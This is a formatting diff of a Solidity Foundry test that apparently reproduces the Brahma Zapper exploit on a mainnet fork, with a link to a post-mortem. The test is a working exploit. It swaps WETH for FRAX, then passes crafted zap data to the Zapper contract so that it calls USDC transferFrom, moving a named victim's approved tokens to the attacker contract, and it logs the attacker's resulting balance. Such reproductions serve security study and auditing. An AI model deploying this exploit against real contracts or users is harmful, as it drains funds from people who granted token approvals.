@@ -11,6 +11,7 @@ import {IUniswapV2Router} from "src/interfaces/IUniswapV2Router.sol";
 // offcial post-mortem: https://medium.com/neptune-mutual/decoding-brahma-brahtopg-smart-contract-vulnerability-7b7c364b79d8
 
 interface Zapper {
+
     struct ZapData {
         address requiredToken;
         uint256 amountIn;
@@ -21,15 +22,16 @@ interface Zapper {
     }
 
     function zapIn(ZapData calldata zapCall) external;
+
 }
 
 contract ContractTest is Test {
+
     Zapper zappper = Zapper(0xD248B30A3207A766d318C7A87F5Cf334A439446D);
     IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
     IERC20 USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
     IERC20 FRAX = IERC20(0x853d955aCEf822Db058eb8505911ED77F175b99e);
-    IUniswapV2Router Router =
-        IUniswapV2Router(payable(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D));
+    IUniswapV2Router Router = IUniswapV2Router(payable(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D));
     address victimAddress = 0xA19789f57D0E0225a82EEFF0FeCb9f3776f276a3;
 
     function setUp() public {
@@ -37,7 +39,7 @@ contract ContractTest is Test {
     }
 
     function testExploit() public {
-        (bool success1, ) = address(WETH).call{value: 1e15}("");
+        (bool success1,) = address(WETH).call{value: 1e15}("");
         WETHToFRAX();
         uint256 balance = USDC.balanceOf(victimAddress);
         uint256 allowance = USDC.allowance(victimAddress, address(zappper));
@@ -45,12 +47,8 @@ contract ContractTest is Test {
         if (balance > allowance) {
             amount = allowance;
         }
-        bytes memory data = abi.encodeWithSignature(
-            "transferFrom(address,address,uint256)",
-            victimAddress,
-            address(this),
-            amount
-        );
+        bytes memory data =
+            abi.encodeWithSignature("transferFrom(address,address,uint256)", victimAddress, address(this), amount);
         Zapper.ZapData memory zapData = Zapper.ZapData({
             requiredToken: address(this),
             amountIn: 1,
@@ -61,11 +59,7 @@ contract ContractTest is Test {
         });
         zappper.zapIn(zapData);
 
-        emit log_named_decimal_uint(
-            "[End] Attacker USDC balance after exploit",
-            USDC.balanceOf(address(this)),
-            6
-        );
+        emit log_named_decimal_uint("[End] Attacker USDC balance after exploit", USDC.balanceOf(address(this)), 6);
     }
 
     function WETHToFRAX() internal {
@@ -74,19 +68,11 @@ contract ContractTest is Test {
         path[0] = address(WETH);
         path[1] = address(FRAX);
         Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
-            WETH.balanceOf(address(this)),
-            0,
-            path,
-            address(this),
-            block.timestamp
+            WETH.balanceOf(address(this)), 0, path, address(this), block.timestamp
         );
     }
 
-    function transferFrom(
-        address sender,
-        address recipient,
-        uint256 amount
-    ) external pure returns (bool) {
+    function transferFrom(address sender, address recipient, uint256 amount) external pure returns (bool) {
         return true;
     }
 
@@ -98,4 +84,5 @@ contract ContractTest is Test {
         FRAX.transfer(address(zappper), 10);
         return true;
     }
+
 }
